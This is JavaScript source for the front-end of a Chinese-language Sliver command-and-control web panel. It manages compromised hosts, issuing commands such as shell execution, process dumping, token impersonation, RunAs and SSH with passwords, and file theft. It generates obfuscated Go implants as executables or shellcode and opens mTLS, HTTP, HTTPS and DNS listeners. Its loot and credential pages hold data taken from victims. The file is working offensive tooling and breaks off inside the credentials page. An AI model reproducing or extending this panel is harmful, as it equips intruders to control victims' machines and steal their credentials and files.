const pages = [
  ["dashboard", "首页"],
  ["implants", "目标"],
  ["payloads", "植入体"],
  ["listeners", "监听端口"],
  ["loot", "文件"],
  ["creds", "账密"],
  ["hosts", "历史机器"],
  ["websites", "托管网页"],
  ["config", "系统资料"],
  ["operators", "登录账号"],
];

const actions = [
  { id: "execute", group: "执行", label: "执行程序", fields: [
    ["path", "程序", "/bin/sh"], ["args", "参数", "-c id"],
  ]},
  { id: "ping", group: "信息", label: "Ping" },
  { id: "pwd", group: "信息", label: "当前目录" },
  { id: "ifconfig", group: "信息", label: "网卡" },
  { id: "netstat", group: "信息", label: "网络连接", fields: [
    ["tcp", "TCP", false, "check"], ["udp", "UDP", false, "check"], ["listening", "仅监听", false, "check"],
  ]},
  { id: "ps", group: "信息", label: "进程", fields: [["full", "完整信息", false, "check"]] },
  { id: "terminate", group: "信息", label: "结束进程", fields: [["pid", "PID", ""], ["force", "强制", false, "check"]] },
  { id: "procdump", group: "信息", label: "进程转储", fields: [["pid", "PID", ""]] },
  { id: "env", group: "信息", label: "环境变量", fields: [["name", "变量名，空则全部", ""]] },
  { id: "setenv", group: "信息", label: "设置变量", fields: [["name", "名称", ""], ["args", "值", ""]] },
  { id: "unsetenv", group: "信息", label: "删除变量", fields: [["name", "名称", ""]] },
  { id: "mount", group: "信息", label: "挂载" },
  { id: "services", group: "信息", label: "服务", fields: [["hostname", "主机名，可空", ""]] },
  { id: "privs", group: "信息", label: "权限" },
  { id: "token", group: "信息", label: "当前令牌" },
  { id: "screenshot", group: "信息", label: "截屏" },
  { id: "ls", group: "文件", label: "列目录", fields: [["path", "路径", "."]] },
  { id: "cd", group: "文件", label: "切换目录", fields: [["path", "路径", ""]] },
  { id: "mkdir", group: "文件", label: "新建目录", fields: [["path", "路径", ""]] },
  { id: "rm", group: "文件", label: "删除", fields: [["path", "路径", ""], ["recursive", "递归", false, "check"], ["force", "强制", false, "check"]] },
  { id: "mv", group: "文件", label: "移动", fields: [["src", "源", ""], ["dst", "目标", ""]] },
  { id: "cp", group: "文件", label: "复制", fields: [["src", "源", ""], ["dst", "目标", ""]] },
  { id: "chmod", group: "文件", label: "改权限", fields: [["path", "路径", ""], ["mode", "权限", "755"], ["recursive", "递归", false, "check"]] },
  { id: "download", group: "文件", label: "下载文件", fields: [["path", "路径", ""]] },
  { id: "grep", group: "文件", label: "搜索", fields: [["pattern", "内容", ""], ["path", "路径", "."], ["recursive", "递归", true, "check"]] },
  { id: "reg-read", group: "注册表", label: "读值", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""], ["key", "键", ""]] },
  { id: "reg-subkeys", group: "注册表", label: "子键", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""]] },
  { id: "reg-values", group: "注册表", label: "值列表", fields: [["hive", "Hive", "HKCU"], ["path", "路径", ""]] },
  { id: "runas", group: "身份", label: "RunAs", fields: [["username", "用户", ""], ["domain", "域", ""], ["password", "密码", ""], ["process", "进程", ""], ["args", "参数", ""]] },
  { id: "impersonate", group: "身份", label: "模拟用户", fields: [["username", "用户", ""]] },
  { id: "rev2self", group: "身份", label: "恢复自身" },
  { id: "make-token", group: "身份", label: "制作令牌", fields: [["username", "用户", ""], ["domain", "域", ""], ["password", "密码", ""]] },
  { id: "ssh", group: "身份", label: "SSH 命令", fields: [["hostname", "主机", ""], ["port", "端口", "22"], ["username", "用户", ""], ["password", "密码", ""], ["command", "命令", "id"]] },
  { id: "extensions", group: "管理", label: "扩展列表" },
  { id: "open-session", group: "管理", label: "让定时回来的机器改成一直连着" },
  { id: "close-session", group: "管理", label: "断开这次连接" },
  { id: "rename", group: "管理", label: "重命名", fields: [["name", "新名称", ""]] },
  { id: "reconfigure", group: "管理", label: "修改回连时间", fields: [["reconnect", "断线后多少秒再连", "60"], ["interval", "定时回来的间隔秒", ""], ["jitter", "间隔上下浮动的秒数", ""]] },
  { id: "kill", group: "管理", label: "让这台机器退出", fields: [["force", "强制", false, "check"]] },
  { id: "remove", group: "管理", label: "从列表里删掉定时回来的记录" },
];

const state = {
  token: sessionStorage.getItem("sliver-web-token") || "",
  page: "dashboard",
  sessions: [],
  beacons: [],
  selected: null,
  tab: "command",
  cwd: ".",
  action: "execute",
  implantKind: null,
  liteSelected: null,
  liteBeacons: [],
  liteTab: "term",
  liteDir: "",
  aliases: {},
  targetNote: "",
  aliasEditing: false,
  liteEntries: {},
  liteHist: {},
  liteHistIdx: {},
};

const $ = (id) => document.getElementById(id);

function esc(value) {
  return String(value ?? "").replace(/[&<>"']/g, (ch) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[ch]));
}

function when(unix) {
  if (!unix) return "—";
  return new Date(unix * 1000).toLocaleString();
}

function bytesOf(b64) {
  if (!b64) return new Uint8Array();
  const raw = atob(b64);
  const out = new Uint8Array(raw.length);
  for (let i = 0; i < raw.length; i++) out[i] = raw.charCodeAt(i);
  return out;
}

function textOf(b64) {
  if (!b64) return "";
  try { return new TextDecoder().decode(bytesOf(b64)); } catch { return ""; }
}

async function api(path, options = {}) {
  const headers = { Authorization: "Bearer " + state.token };
  let body = options.body;
  if (options.json !== undefined) {
    headers["Content-Type"] = "application/json";
    body = JSON.stringify(options.json);
  }
  const res = await fetch(path, { method: options.method || "GET", headers, body });
  const type = res.headers.get("content-type") || "";
  if (type.includes("application/json")) {
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || res.statusText);
    return data;
  }
  if (!res.ok) throw new Error((await res.text()) || res.statusText);
  return res;
}

function fileNameOf(path) {
  if (!path) return "";
  const parts = String(path).split(/[\\/]/);
  return parts[parts.length - 1] || "";
}

function downloadBlob(blob, name) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = name || "implant";
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 1500);
}

function pill(dead) {
  return `<span class="pill ${dead ? "dead" : ""}"><i></i>${dead ? "离线" : "在线"}</span>`;
}

function table(headers, rows) {
  return `<div class="table-wrap"><table><thead><tr>${headers.map((h) => `<th>${esc(h)}</th>`).join("")}</tr></thead><tbody>${rows.join("") || `<tr><td colspan="${headers.length}">没有数据</td></tr>`}</tbody></table></div>`;
}

async function boot() {
  $("nav").innerHTML = pages.map(([id, label]) => `<button data-page="${id}">${label}</button>`).join("");
  $("nav").onclick = (event) => {
    const button = event.target.closest("button");
    if (!button) return;
    state.page = button.dataset.page;
    state.selected = null;
    state.liteSelected = null;
    state.implantKind = null;
    state.targetNote = "";
    state.aliasEditing = false;
    render();
  };
  $("refresh").onclick = () => render();
  $("logout").onclick = () => {
    sessionStorage.removeItem("sliver-web-token");
    state.token = "";
    showLogin();
  };
  $("login-form").onsubmit = async (event) => {
    event.preventDefault();
    const username = $("username").value.trim();
    const password = $("password").value;
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error || "登录失败");
      state.token = data.token;
      sessionStorage.setItem("sliver-web-token", data.token);
      $("login-error").textContent = "";
      showApp();
    } catch (err) {
      $("login-error").textContent = err.message;
    }
  };
  if (!state.token) return showLogin();
  try {
    await api("/api/version");
    showApp();
  } catch {
    showLogin();
  }
}

function showLogin() {
  $("login").classList.remove("hidden");
  $("shell").classList.add("hidden");
  clearInterval(state.timer);
  stopLiteTimers();
}

function showApp() {
  $("login").classList.add("hidden");
  $("shell").classList.remove("hidden");
  render();
  clearInterval(state.timer);
  state.timer = setInterval(() => {
    if (state.page === "dashboard") refreshImplants(false);
    if (state.page === "implants" && !state.selected && !state.liteSelected && !state.aliasEditing) render();
  }, 5000);
}

async function render() {
  stopLiteTimers();
  document.querySelectorAll("#nav button").forEach((button) => {
    button.classList.toggle("active", button.dataset.page === state.page);
  });
  const meta = pages.find((item) => item[0] === state.page);
  $("title").textContent = state.selected ? targetLabel(state.selected) : meta[1];
  $("subtitle").textContent = state.selected ? `${kindLabel(state.selected.kind)} · ${state.selected.Hostname || ""}` : "这个页面只在你自己的电脑上打开";
  $("clock").textContent = new Date().toLocaleTimeString();
  const view = $("view");
  view.innerHTML = `<p class="hint">加载中…</p>`;
  try {
    if (state.page === "dashboard") await renderDashboard(view);
    else if (state.page === "implants") await renderImplants(view);
    else if (state.page === "payloads") await renderPayloads(view);
    else if (state.page === "listeners") await renderListeners(view);
    else if (state.page === "loot") await renderLoot(view);
    else if (state.page === "creds") await renderCreds(view);
    else if (state.page === "hosts") await renderHosts(view);
    else if (state.page === "websites") await renderWebsites(view);
    else if (state.page === "config") await renderConfig(view);
    else if (state.page === "operators") await renderOperators(view);
  } catch (err) {
    view.innerHTML = `<p class="error">${esc(err.message)}</p>`;
  }
}

async function refreshImplants(redraw) {
  const [sessions, beacons] = await Promise.all([api("/api/sessions"), api("/api/beacons")]);
  state.sessions = sessions.Sessions || [];
  state.beacons = beacons.Beacons || [];
  if (state.selected) {
    const pool = state.selected.kind === "beacon" ? state.beacons : state.sessions;
    const fresh = pool.find((item) => item.ID === state.selected.ID);
    if (fresh) state.selected = Object.assign(fresh, { kind: state.selected.kind });
    else state.selected = null;
  }
  if (redraw) render();
}

async function renderDashboard(view) {
  const data = await api("/api/overview");
  view.innerHTML = `
    <div class="cards">
      ${card("一直连着", data.sessionsAlive, `共 ${data.sessions} 台`)}
      ${card("定时回来", data.beaconsAlive, `共 ${data.beacons} 台`)}
      ${card("监听端口", data.jobs, "正在等机器连上来")}
      ${card("当前时间", new Date(data.time * 1000).toLocaleTimeString(), "目标列表每 5 秒刷新")}
    </div>
    <section class="panel"><h3>从这里开始</h3>
      <p class="hint">「目标」统一管理已经连回来的机器，Go 和 C 都在这张表里。点进去再操作。「植入体」里选择类型后当场编译。「监听端口」里的 HTTPS 同时接待 Go 和 C，靠路径分开。</p>
    </section>`;
}

function card(label, value, note) {
  return `<article class="card"><span>${esc(label)}</span><b>${esc(value)}</b><span>${esc(note)}</span></article>`;
}

async function renderImplants(view) {
  const [lite, aliasBook] = await Promise.all([
    api("/api/lite/beacons"),
    api("/api/targets/aliases"),
    refreshImplants(false),
  ]);
  state.liteBeacons = lite.Beacons || [];
  state.aliases = aliasBook.aliases || {};
  if (state.liteSelected && !liteBeacon(state.liteSelected)) state.liteSelected = null;
  if (state.selected) $("title").textContent = targetLabel(state.selected);
  if (state.liteSelected) return renderLiteConsole(view);
  if (state.selected) return renderInteract(view);
  const rows = [];
  for (const item of state.sessions) rows.push(implantRow(item, "session"));
  for (const item of state.beacons) rows.push(implantRow(item, "beacon"));
  for (const item of state.liteBeacons) rows.push(liteRow(item));
  view.innerHTML = `<section class="panel targets"><h3>目标</h3>
    <p class="hint">点一行进入这台机器。点别名可以直接改，留空就恢复成机器名。在线是绿色，离线是红色。</p>
    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
    ${table(["状态", "别名", "植入体", "怎么连", "机器名", "用户", "系统", "地址", "最近联系", "操作"], rows)}</section>`;
  view.querySelectorAll("tr.clickable").forEach((row) => {
    row.onclick = (event) => {
      if (event.target.closest("button, .alias, input")) return;
      const kind = row.dataset.kind;
      if (kind === "lite") {
        state.selected = null;
        state.liteSelected = row.dataset.id;
        state.liteTab = "term";
        state.liteDir = "";
      } else {
        state.liteSelected = null;
        const pool = kind === "beacon" ? state.beacons : state.sessions;
        state.selected = Object.assign({}, pool.find((item) => item.ID === row.dataset.id), { kind });
        state.cwd = ".";
      }
      render();
    };
  });
  bindTargetActions(view);
  bindAliasEditors(view);
}

function machineName(item) {
  if (!item) return "";
  const info = item.Info || {};
  return item.Hostname || info.Hostname || "";
}

function shownAlias(id, hostname) {
  return state.aliases[id] || hostname || "未知机器";
}

function targetLabel(item) {
  if (!item) return "";
  return shownAlias(item.ID, machineName(item));
}

function aliasView(tag, kind, id, hostname) {
  return `<${tag} class="alias" data-kind="${esc(kind)}" data-id="${esc(id)}" data-host="${esc(hostname || "")}" title="点击修改别名">${esc(shownAlias(id, hostname))}</${tag}>`;
}

function targetActions(kind, id) {
  const button = (act, label, danger) => `<button type="button" class="small${danger ? " danger" : ""}" data-act="${act}" data-kind="${esc(kind)}" data-id="${esc(id)}">${label}</button>`;
  return `<span class="row-actions">${button("remove", "删除", true)}${button("stop", "结束", true)}</span>`;
}

function bindAliasEditors(root) {
  root.querySelectorAll(".alias").forEach((cell) => {
    cell.onmousedown = (event) => {
      if (cell.querySelector("input")) return;
      event.preventDefault();
      event.stopPropagation();
    };
    cell.onclick = (event) => {
      event.preventDefault();
      event.stopPropagation();
      if (cell.querySelector("input")) return;
      const current = shownAlias(cell.dataset.id, cell.dataset.host);
      state.aliasEditing = true;
      cell.innerHTML = `<input value="${esc(current)}" maxlength="32" aria-label="别名">`;
      const input = cell.querySelector("input");
      input.focus();
      input.select();
      let closed = false;
      const finish = async (save) => {
        if (closed) return;
        closed = true;
        const next = input.value.trim();
        const host = cell.dataset.host || "";
        if (!save || next === current) {
          cell.textContent = current;
          state.aliasEditing = false;
          return;
        }
        try {
          const saved = await api("/api/targets/rename", { method: "POST", json: { kind: cell.dataset.kind, id: cell.dataset.id, name: next === host ? "" : next } });
          if (!saved.name || saved.name === host) delete state.aliases[cell.dataset.id];
          else state.aliases[cell.dataset.id] = saved.name;
          const label = shownAlias(cell.dataset.id, host);
          cell.textContent = label;
          if ($("title") && (state.selected || state.liteSelected)) $("title").textContent = label;
          state.targetNote = saved.name ? "别名已改成 " + saved.name : "别名已恢复成机器名";
        } catch (err) {
          cell.textContent = current;
          state.targetNote = err.message;
        }
        const note = $("target-note");
        if (note) note.textContent = state.targetNote;
        state.aliasEditing = false;
      };
      input.onclick = (event) => event.stopPropagation();
      input.onkeydown = (event) => {
        event.stopPropagation();
        if (event.key === "Enter") {
          event.preventDefault();
          finish(true);
        } else if (event.key === "Escape") {
          event.preventDefault();
          finish(false);
        }
      };
      input.onblur = () => finish(true);
    };
  });
}

function bindTargetActions(root) {
  root.querySelectorAll("[data-act]").forEach((button) => {
    button.onclick = async (event) => {
      event.preventDefault();
      event.stopPropagation();
      const kind = button.dataset.kind;
      const id = button.dataset.id;
      try {
        if (button.dataset.act === "remove") {
          if (!confirm("从列表拿掉这台机器。程序如果还在，下次再发信号会重新出现在列表里。")) return;
          await api("/api/targets/remove", { method: "POST", json: { kind, id } });
          delete state.aliases[id];
          if (state.selected && state.selected.ID === id) state.selected = null;
          if (state.liteSelected === id) state.liteSelected = null;
          state.targetNote = "已从列表删除";
        } else if (button.dataset.act === "stop") {
          if (!confirm("结束会让对面的程序退出。定时回来的机器要等下次连上才会真正退出，退出后可以再点删除。")) return;
          await api("/api/targets/stop", { method: "POST", json: { kind, id } });
          if (kind === "session" && state.selected && state.selected.ID === id) state.selected = null;
          state.targetNote = kind === "session" ? "已让这台机器退出" : "退出命令已记下，等它下次连上";
        }
        render();
      } catch (err) {
        state.targetNote = err.message;
        const note = $("target-note");
        if (note) note.textContent = err.message;
        else render();
      }
    };
  });
}

function kindLabel(kind) {
  return kind === "beacon" ? "定时回来" : "一直连着";
}

function implantRow(item, kind) {
  return `<tr class="clickable" data-kind="${kind}" data-id="${esc(item.ID)}">
    <td>${pill(item.IsDead)}</td>${aliasView("td", kind, item.ID, item.Hostname)}<td>Go</td><td>${kindLabel(kind)}</td><td class="clip" title="${esc(item.Hostname)}">${esc(item.Hostname)}</td>
    <td>${esc(item.Username)}</td><td class="clip" title="${esc(item.OS)}/${esc(item.Arch)}">${esc(item.OS)}/${esc(item.Arch)}</td><td>${esc(item.RemoteAddress || "—")}</td><td>${when(item.LastCheckin)}</td>
    <td class="actions">${targetActions(kind, item.ID)}</td></tr>`;
}

function liteRow(item) {
  const info = item.Info || {};
  const stale = liteLost(item);
  return `<tr class="clickable" data-kind="lite" data-id="${esc(item.ID)}">
    <td>${pill(stale)}</td>${aliasView("td", "lite", item.ID, info.Hostname || "")}<td>C</td><td>定时回来</td><td class="clip" title="${esc(info.Hostname || "")}">${esc(info.Hostname || "")}</td>
    <td>${esc(info.Username || "")}</td><td class="clip" title="${esc(info.OS || "")}/${esc(info.Arch || "")}">${esc(info.OS || "")}/${esc(info.Arch || "")}</td><td>—</td><td>${esc(liteAgo(item.LastSeen))}</td>
    <td class="actions">${targetActions("lite", item.ID)}</td></tr>`;
}

function liteAgeSec(iso) {
  if (!iso) return Infinity;
  const ms = Date.now() - new Date(iso).getTime();
  if (isNaN(ms)) return Infinity;
  return Math.max(0, Math.round(ms / 1000));
}

function liteLost(item) {
  const interval = Math.max(5, Number(item && item.IntervalSec) || 10);
  // 空闲时实际睡眠是间隔的 0.5~3 倍；干活时按间隔整秒。超过 4 倍才算失联。
  return liteAgeSec(item && item.LastSeen) > interval * 4;
}

async function renderInteract(view) {
  const item = state.selected;
  view.innerHTML = `
    <div class="row" style="margin-bottom:12px">
      <button class="ghost" id="back">返回列表</button>
      <span class="hint">${aliasView("span", item.kind, item.ID, item.Hostname)} · ${esc(item.Username)}@${esc(item.Hostname)} · ${esc(item.OS)}/${esc(item.Arch)} · ${esc(item.ActiveC2 || item.Transport)} · PID ${esc(item.PID)}</span>
      ${pill(item.IsDead)}
      ${targetActions(item.kind, item.ID)}
    </div>
    <p id="target-note" class="hint">${esc(state.targetNote)}</p>
    <div class="tabs" id="tabs">
      <button data-tab="command" class="${state.tab === "command" ? "active" : ""}">全部命令</button>
      <button data-tab="terminal" class="${state.tab === "terminal" ? "active" : ""}">终端</button>
      <button data-tab="files" class="${state.tab === "files" ? "active" : ""}">文件</button>
      <button data-tab="grabbed" class="${state.tab === "grabbed" ? "active" : ""}">拿回的文件</button>
      <button data-tab="tasks" class="${state.tab === "tasks" ? "active" : ""}">任务</button>
    </div>
    <div id="interact"></div>`;
  $("back").onclick = () => { state.selected = null; state.targetNote = ""; render(); };
  bindTargetActions(view);
  bindAliasEditors(view);
  view.querySelectorAll("#tabs button").forEach((button) => {
    button.onclick = () => { state.tab = button.dataset.tab; render(); };
  });
  const box = view.querySelector("#interact");
  if (state.tab === "files") return renderFiles(box);
  if (state.tab === "grabbed") return renderGrabbed(box, item.kind + ":" + item.ID);
  if (state.tab === "tasks") return renderTasks(box);
  if (state.tab === "terminal") return renderTerminal(box);
  return renderCommandBrowser(box, "implant", item);
}

function renderResult(action, result) {
  if (result && result.ok) return "完成。";
  const response = result.Response || {};
  if (response.Async) return `任务已下发。\n任务 ID：${response.TaskID || ""}`;
  if (action === "execute" || action === "ssh") {
    return [textOf(result.Stdout), textOf(result.Stderr), result.StdOut, result.StdErr].filter(Boolean).join("\n") || "没有输出";
  }
  if (action === "screenshot" && result.Data) {
    const blob = new Blob([bytesOf(result.Data)]);
    const url = URL.createObjectURL(blob);
    return `<img class="shot" alt="截屏" src="${url}">`;
  }
  if ((action === "download" || action === "procdump") && result.Data) {
    const blob = new Blob([bytesOf(result.Data)]);
    const name = result.Path ? result.Path.split("/").pop() : action + ".bin";
    setTimeout(() => downloadBlob(blob, name), 0);
    return `已开始下载 ${name}（${bytesOf(result.Data).length} 字节）`;
  }
  if (action === "ls" && result.Files) {
    return result.Files.map((file) => `${file.Mode || ""} ${file.IsDir ? "d" : "-"} ${file.Size}\t${file.Name}`).join("\n") || "空目录";
  }
  if (action === "ps" && result.Processes) {
    return result.Processes.map((proc) => `${proc.Pid}\t${proc.Owner || ""}\t${proc.Executable || ""}`).join("\n");
  }
  return JSON.stringify(result, null, 2);
}

async function renderFiles(box) {
  box.innerHTML = `<div class="panel">
    <form id="ls-form" class="row"><label>路径<input id="file-path" value="${esc(state.cwd)}"></label><button type="submit">打开</button></form>
    <form id="up-form" class="row"><label>上传到<input id="up-path" placeholder="/tmp/file"></label><input id="up-file" type="file"><button type="submit">上传</button></form>
    <div id="file-list"></div><p id="file-note" class="hint"></p></div>`;
  const load = async (path) => {
    state.cwd = path || ".";
    $("file-path").value = state.cwd;
    $("file-note").textContent = "读取中…";
    try {
      const result = await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "ls", path: state.cwd } });
      if (result.Response && result.Response.Async) {
        $("file-list").innerHTML = "";
        $("file-note").textContent = "这台机器是定时回来的，目录列表要等它下次连上，再到「任务」页看结果。";
        return;
      }
      const files = result.Files || [];
      $("file-list").innerHTML = table(["名称", "大小", "权限", "修改时间", ""], files.map((file) => {
        const full = joinPath(state.cwd, file.Name);
        return `<tr class="files"><td class="fname" data-name="${esc(file.Name)}" data-dir="${file.IsDir}">${esc(file.Name)}${file.IsDir ? "/" : ""}</td><td>${esc(file.Size)}</td><td>${esc(file.Mode)}</td><td>${when(file.ModTime)}</td><td>${file.IsDir ? "" : `<button class="mini" data-dl="${esc(full)}">下载</button>`}</td></tr>`;
      }));
      $("file-note").textContent = result.Path || "";
      $("file-list").querySelectorAll("td.fname").forEach((cell) => {
        cell.onclick = () => {
          const next = joinPath(state.cwd, cell.dataset.name);
          if (cell.dataset.dir === "true") load(next);
          else {
            $("file-list").querySelectorAll("tr.files").forEach((row) => row.classList.remove("sel"));
            cell.closest("tr").classList.add("sel");
            $("file-note").textContent = "已选中 " + cell.dataset.name + "，点右侧「下载」才会传输。";
          }
        };
      });
      $("file-list").querySelectorAll("button[data-dl]").forEach((btn) => {
        btn.onclick = (event) => { event.stopPropagation(); taskDownload(btn.dataset.dl); };
      });
    } catch (err) {
      $("file-note").textContent = err.message;
    }
  };
  $("ls-form").onsubmit = (event) => { event.preventDefault(); load($("file-path").value); };
  $("up-form").onsubmit = async (event) => {
    event.preventDefault();
    const data = new FormData();
    data.set("kind", state.selected.kind);
    data.set("id", state.selected.ID);
    data.set("path", $("up-path").value);
    data.set("file", $("up-file").files[0]);
    const res = await fetch("/api/upload", { method: "POST", headers: { Authorization: "Bearer " + state.token }, body: data });
    const type = res.headers.get("content-type") || "";
    const payload = type.includes("json") ? await res.json() : null;
    $("file-note").textContent = res.ok ? "上传完成" : (payload && payload.error) || "上传失败";
    if (res.ok) load(state.cwd);
  };
  load(state.cwd);
}

function joinPath(dir, name) {
  if (!dir || dir === ".") return name;
  return dir.replace(/\/$/, "") + "/" + name;
}

async function taskDownload(path) {
  const result = await api("/api/task", { method: "POST", json: { kind: state.selected.kind, id: state.selected.ID, action: "download", path } });
  if (result.Response && result.Response.Async) {
    $("file-note").textContent = "这台机器是定时回来的，下载要等它下次连上。";
    return;
  }
  downloadBlob(new Blob([bytesOf(result.Data)]), path.split("/").pop());
}

async function renderTasks(box) {
  if (state.selected.kind !== "beacon") {
    box.innerHTML = `<p class="hint">一直连着的机器会马上返回结果。定时回来的机器才会把命令排进队列。</p>`;
    return;
  }
  const data = await api("/api/beacons/tasks?id=" + encodeURIComponent(state.selected.ID));
  const tasks = data.Tasks || [];
  box.innerHTML = table(["状态", "描述", "创建", "完成", "ID"], tasks.map((task) => `<tr><td>${esc(task.State)}</td><td>${esc(task.Description)}</td><td>${when(task.CreatedAt)}</td><td>${when(task.CompletedAt)}</td><td class="mono">${esc(task.ID)}</td></tr>`));
}

const implantCatalog = [
  ["go", "Go", "功能完整。支持命令、文件、实时终端。在这台电脑上编译，体积较大。"],
  ["c", "C", "只做回连、执行命令和读文件。在这里选好参数后当场编译，体积小。"],
];

async function renderPayloads(view) {
  if (state.implantKind === "c") return renderCImplant(view);
  if (state.implantKind === "go") return renderGoImplant(view);
  const rows = implantCatalog.map(([id, name, note]) => `<tr class="clickable" data-kind="${id}"><td>${esc(name)}</td><td>${esc(note)}</td><td>生成</td></tr>`);
  view.innerHTML = `<section class="panel"><h3>植入体</h3>
    <p class="hint">先选一种植入体，再生成。已经连回来的机器都在「目标」里管理。</p>
    ${table(["植入体", "说明", ""], rows)}</section>`;
  view.querySelectorAll("tr.clickable").forEach((row) => {
    row.onclick = () => { state.implantKind = row.dataset.kind; render(); };
  });
}

async function renderGoImplant(view) {
  const builds = await api("/api/implants/builds");
  const configs = builds.Configs || {};
  const rows = Object.keys(configs).map((name) => {
    const cfg = configs[name];
    const c2 = (cfg.C2 || []).map((item) => item.URL).join(", ");
    return `<tr><td>${esc(name)}</td><td>${cfg.IsBeacon ? "定时回来" : "一直连着"}</td><td>${esc(cfg.GOOS)}/${esc(cfg.GOARCH)}</td><td>${esc(c2)}</td><td><button class="small" data-rebuild="${esc(name)}">下载</button> <button class="small danger" data-del="${esc(name)}">删除</button></td></tr>`;
  });
  view.innerHTML = `
    <div class="lite-actions"><button type="button" class="ghost" id="implant-back">返回列表</button></div>
    <form id="gen" class="panel"><h3>生成 Go 植入体</h3>
      <div class="row">
        <label>名称<input name="name" placeholder="留空会自动起名"></label>
        <label>系统<select name="os"><option>linux</option><option>windows</option><option>darwin</option></select></label>
        <label>芯片<select name="arch"><option>amd64</option><option>arm64</option><option>386</option></select></label>
      </div>
      <div class="row">
        <label>连回这个地址<input name="c2" value="mtls://127.0.0.1:8888" required></label>
        <label>文件类型<select name="format"><option value="EXECUTABLE">可执行文件</option><option value="SHARED_LIB">动态库</option><option value="SHELLCODE">可注入的机器码</option><option value="SERVICE">系统服务</option></select></label>
      </div>
      <div class="row">
        <label><input name="beacon" type="checkbox"> 定时回来，而不是一直连着</label>
        <label>隔多少秒回来一次<input name="interval" value="60"></label>
        <label>时间上下浮动秒数<input name="jitter" value="30"></label>
        <label><input name="obfuscate" type="checkbox"> 打乱函数名</label>
      </div>
      <button type="submit">生成并下载</button>
      <p id="gen-note" class="hint">同名会直接覆盖上一份。打乱函数名会更慢，也更占内存。</p>
    </form>
    <section class="panel"><h3>已经生成过的植入体</h3>
      <p id="builds-note" class="hint">点「下载」会把文件存进浏览器的下载目录。点「删除」会从这台电脑上删掉这份文件和记录。</p>
      ${table(["名称", "上线方式", "要跑在哪", "回连地址", "操作"], rows)}</section>`;
  $("implant-back").onclick = () => { state.implantKind = null; render(); };
  $("gen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    const note = $("gen-note");
    note.textContent = "正在编译，可能需要几分钟…";
    try {
      const res = await api("/api/implants/generate", { method: "POST", json: {
        name: form.get("name"), os: form.get("os"), arch: form.get("arch"), c2: form.get("c2"),
        format: form.get("format"), beacon: form.get("beacon") === "on",
        interval: Number(form.get("interval") || 60), jitter: Number(form.get("jitter") || 0),
        obfuscate: form.get("obfuscate") === "on",
      }});
      const blob = await res.blob();
      const name = res.headers.get("X-Implant-Name") || "implant";
      downloadBlob(blob, name);
      note.textContent = "已下载 " + name;
      render();
    } catch (err) {
      note.textContent = err.message;
    }
  };
  view.querySelectorAll("[data-rebuild]").forEach((button) => button.onclick = async () => {
    const note = $("builds-note");
    note.textContent = "正在下载…";
    try {
      await rebuild(button.dataset.rebuild);
      note.textContent = "已保存到浏览器的下载目录";
    } catch (err) {
      note.textContent = err.message;
    }
  });
  view.querySelectorAll("[data-del]").forEach((button) => button.onclick = async () => {
    const note = $("builds-note");
    try {
      await removeBuild(button.dataset.del);
    } catch (err) {
      note.textContent = err.message;
    }
  });
}

async function rebuild(name) {
  const res = await api("/api/implants/regenerate", { method: "POST", json: { name } });
  downloadBlob(await res.blob(), res.headers.get("X-Implant-Name") || name);
}

async function removeBuild(name) {
  await api("/api/implants/builds/delete", { method: "POST", json: { name } });
  render();
}

async function renderListeners(view) {
  const [jobs, sites] = await Promise.all([api("/api/jobs"), api("/api/websites")]);
  const rows = (jobs.Active || []).map((job) => `<tr><td>${esc(job.ID)}</td><td>${esc(job.Name)}</td><td>${esc(job.Protocol)}</td><td>${esc(job.Port)}</td><td>${esc(job.Description)}</td><td><button class="small danger" data-job="${esc(job.ID)}">停止</button></td></tr>`);
  const siteOptions = (sites.Websites || []).map((site) => `<option value="${esc(site.Name)}">${esc(site.Name)}</option>`).join("");
  view.innerHTML = `
    <form id="listen" class="panel"><h3>打开一个监听端口</h3>
      <div class="row">
        <label>协议<select name="proto"><option value="mtls">mTLS</option><option value="http">HTTP</option><option value="https">HTTPS</option><option value="dns">DNS</option></select></label>
        <label>监听地址<input name="host" value="127.0.0.1"></label>
        <label>端口<input name="port" value="8888"></label>
        <label>域名<input name="domain" placeholder="网页用的域名，或域名监听的上级域名"></label>
        <label>托管的网页<select name="website"><option value="">不挂网页</option>${siteOptions}</select></label>
      </div>
      <button type="submit">启动</button>
      <p id="listen-note" class="hint">只有 HTTP 和 HTTPS 会使用「托管的网页」。mTLS 和 DNS 会忽略这一项。</p>
    </form>
    <section class="panel"><h3>正在运行</h3>${table(["ID", "名称", "协议", "端口", "说明", ""], rows)}</section>`;
  $("listen").onsubmit = async (event) => {
    event.preventDefault();
    const form = new FormData(event.target);
    try {
      await api("/api/listeners/" + form.get("proto"), { method: "POST", json: { host: form.get("host"), port: Number(form.get("port")), domain: form.get("domain"), website: form.get("website") } });
      render();
    } catch (err) {
      $("listen-note").textContent = err.message;
    }
  };
  view.querySelectorAll("[data-job]").forEach((button) => button.onclick = async () => {
    await api("/api/jobs/kill", { method: "POST", json: { id: Number(button.dataset.job) } });
    render();
  });
}

async function renderLoot(view) {
  const data = await api("/api/loot");
  const rows = (data.Loot || []).map((item) => `<tr><td>${esc(item.Name)}</td><td>${esc(item.FileType)}</td><td>${esc(item.Size)}</td><td>${esc(item.OriginHostUUID)}</td><td><a href="/api/loot/content?id=${encodeURIComponent(item.ID)}&token=${encodeURIComponent(state.token)}">下载</a> <button class="small danger" data-id="${esc(item.ID)}">删除</button></td></tr>`);
  view.innerHTML = `<section class="panel"><h3>文件</h3>${table(["名称", "类型", "大小", "来自哪台机器", ""], rows)}</section>`;
  view.querySelectorAll("[data-id]").forEach((button) => button.onclick = async () => {
    await api("/api/loot/delete", { method: "POST", json: { id: button.dataset.id } });
    render();
  });
}

async function renderCreds(view) {
  const data = await api("/api/creds");
